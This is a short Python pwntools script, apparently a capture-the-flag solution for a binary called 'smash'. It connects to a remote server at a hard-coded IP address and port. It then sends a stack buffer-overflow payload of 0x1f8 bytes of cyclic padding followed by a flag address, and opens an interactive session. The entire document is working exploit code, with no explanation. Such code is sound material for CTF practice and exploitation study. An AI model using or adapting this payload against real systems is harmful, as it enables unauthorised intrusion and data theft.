from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./smash")
io=remote("43.143.7.97",28537)
flag_addr=0x404060
payload=cyclic(0x1f8)+p64(flag_addr)
io.recvuntil(b"Luck.\n")
io.sendline(payload)
io.interactive()